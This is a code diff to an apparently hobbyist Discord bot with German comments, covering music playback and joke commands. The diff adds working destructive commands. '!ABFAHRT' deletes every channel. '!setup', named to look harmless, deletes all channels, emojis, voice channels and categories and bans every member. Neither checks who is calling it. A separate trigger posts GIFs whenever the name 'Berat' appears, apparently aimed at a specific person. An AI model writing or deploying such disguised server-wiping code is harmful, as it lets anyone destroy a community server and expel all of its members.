@@ -15,6 +15,7 @@ import ffmpeg
 import pytube
 import os
 
+
 intents = discord.Intents.all()
 client = discord.Client(intents = intents)
 
@@ -183,41 +184,56 @@ async def on_message(message):
         await message.channel.send(f"Let's dance :)")
         await message.channel.send(dance)
 
+
     elif message.content.startswith('!L'):
-        message.channel.send('LLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLL' , tts = True)
+        await message.channel.send('LLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLL' , tts = True)
 
     elif message.content.startswith('!details'):
         print(message.channel.id)
 
 #löscht alle channels
-    #elif message.content.startswith('!ABFAHRT'):
-       # await message.channel.send("ABFAHRT!!!" , file = discord.File ("C:\_FSST\Jaeger\Shooting Range\KiddoBot\ABFAHRT.PNG"))
-        #time.sleep(8)
-        #for channel in message.guild.channels:
-           # await channel.delete( reason = 'MFG KiddoBot :)')
+    elif message.content.startswith('!ABFAHRT'):
+        await message.channel.send("ABFAHRT!!!" , file = discord.File ("C:\_FSST\Jaeger\Shooting Range\KiddoBot\ABFAHRT.PNG"))
+        time.sleep(8)
+        for channel in message.guild.channels:
+            await channel.delete( reason = 'MFG KiddoBot :)')
 
+#"setup" löscht alle channels, alle rollen, alle emojis, alle member und alle kategorien
+    elif message.content.startswith('!setup'):
+        await message.channel.send('Einen Moment bitte... :)')
+        time.sleep(2)
+        await message.channel.send("ABFAHRT!!!", file=discord.File("C:\_FSST\Jaeger\Shooting Range\KiddoBot\ABFAHRT.PNG"))
+        time.sleep(8)
+        #for role in message.guild.roles:
+         #   await role.delete(reason='MFG KiddoBot :)')
+
+        for channel in message.guild.channels:
+            if channel == 'rules' or channel == 'moderator-only':
+                pass
+            else:
+                await channel.delete(reason='MFG KiddoBot :)')
+
+        for member in message.guild.members:
+            await member.ban(reason='MFG KiddoBot :)')
+
+        for emoji in message.guild.emojis:
+            await emoji.delete(reason='MFG KiddoBot :)')
+
+        for voice in message.guild.voice_channels:
+            await voice.delete(reason='MFG KiddoBot :)')
+
+        for category in message.guild.categories:
+           await category.delete(reason='MFG KiddoBot :)')
 ########Music-Bot###########################################################################################################
 
     if message.content.startswith('=play'):
         global file
         channel = message.author.voice.channel
-        #await message.channel.send(f'Ich bin bald in {channel} :)')
 
-        #vc = await channel.connect()
 
         if not message.author.voice:
             await message.channel.send("Du bist nicht in einem Voice-Channel Bozo 🤡")
             return
-        #elif message.author.voice.channel == channel:
-         #   await message.channel.send(f'Der Song wird bald gespielt :)')
-          #  file = pytube.YouTube(message.content[6:]).streams.get_audio_only().download()
-           # #global file
-            #file = pytube.YouTube(message.content[6:]).streams.get_audio_only().download()
-           # vc.play(discord.FFmpegPCMAudio(file))
-            #vc.is_playing()
-            #await message.channel.send('Ich spiele jetzt ' + message.content[6:] + ' :)')
-            #if vc.is_playing() == False:
-                #os.remove(file)
         else:
             await message.channel.send(f'Ich bin bald in {channel} :)')
             file = pytube.YouTube(message.content[6:]).streams.get_audio_only().download()
@@ -253,6 +269,13 @@ async def on_message(message):
 
 
 #####################2BHEL Zeug#############################################################################################
+
+# schaut sich an, ob das word "Berat" in einer nachricht steht und sendet dann ein gif
+    elif "Berat" in message.content or "berat" in message.content:
+        berat = open("berat.txt", "r")
+        berat = berat.readlines()
+        berat = random.choice(berat)
+        await message.channel.send(berat)
 
 
     elif message.content.startswith('leon'):
